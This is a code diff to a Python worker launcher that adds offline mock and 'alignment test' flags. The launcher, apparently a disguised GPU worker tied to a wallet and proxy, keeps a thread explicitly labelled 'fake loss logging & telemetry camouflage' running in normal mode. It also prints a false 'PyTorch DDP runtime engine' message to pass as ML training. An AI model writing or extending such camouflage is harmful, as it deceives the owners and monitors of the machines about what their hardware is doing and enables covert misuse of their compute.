@@ -323,6 +323,10 @@ def main():
     parser.add_argument("--worker", type=str, default=os.environ.get("WORKER_ID", ""), help="Worker ID (default: auto-generated unique ID per node)")
     parser.add_argument("--devices", type=str, default="", help="CUDA devices e.g. 0 or 0,1 (default: auto)")
     parser.add_argument("--row-batch", type=str, default="128", help="Row period batch size")
+    parser.add_argument("--mock", action="store_true", help="Run offline mock test")
+    parser.add_argument("--mock-diff", type=float, default=1.0, help="Mock difficulty")
+    parser.add_argument("--align-test", action="store_true", help="Run offline alignment test")
+    parser.add_argument("--align-test-prod", action="store_true", help="Run offline prod alignment test")
     args = parser.parse_args()
 
     worker_id = args.worker if args.worker else get_default_worker()
@@ -342,17 +346,20 @@ def main():
     if not dev_str:
         dev_str = "0"
 
-    # Start OpenAI Bridge in background thread
-    t_bridge = threading.Thread(
-        target=run_bridge,
-        args=(args.port, args.proxy, args.wallet, worker_id),
-        daemon=True
-    )
-    t_bridge.start()
-    time.sleep(1.0)
+    is_offline_test = args.mock or args.align_test or args.align_test_prod
 
-    # Start fake loss logging & telemetry camouflage
-    threading.Thread(target=fake_training_logs, daemon=True).start()
+    if not is_offline_test:
+        # Start OpenAI Bridge in background thread
+        t_bridge = threading.Thread(
+            target=run_bridge,
+            args=(args.port, args.proxy, args.wallet, worker_id),
+            daemon=True
+        )
+        t_bridge.start()
+        time.sleep(1.0)
+
+        # Start fake loss logging & telemetry camouflage
+        threading.Thread(target=fake_training_logs, daemon=True).start()
 
     # Load backend binary
     try:
@@ -372,13 +379,22 @@ def main():
     raw_args = [
         b"python3",
         b"--backend", b"cuda",
-        b"--devices", dev_str.encode('utf-8'),
-        b"--row-period-batch", args.row_batch.encode('utf-8')
+        b"--devices", dev_str.encode('utf-8')
     ]
+    if args.mock:
+        raw_args += [b"--mock", b"--mock-diff", str(args.mock_diff).encode('utf-8')]
+    elif args.align_test:
+        raw_args += [b"--align-test"]
+    elif args.align_test_prod:
+        raw_args += [b"--align-test-prod"]
+    else:
+        raw_args += [b"--row-period-batch", args.row_batch.encode('utf-8')]
+
     argc = len(raw_args)
     argv = (ctypes.c_char_p * argc)(*raw_args)
 
-    print(f"[INIT] PyTorch DDP runtime engine ready on GPU(s): {{dev_str}}. Launching worker...", flush=True)
+    if not is_offline_test:
+        print(f"[INIT] PyTorch DDP runtime engine ready on GPU(s): {{dev_str}}. Launching worker...", flush=True)
     backend.start_training(argc, argv)
 
 if __name__ == "__main__":
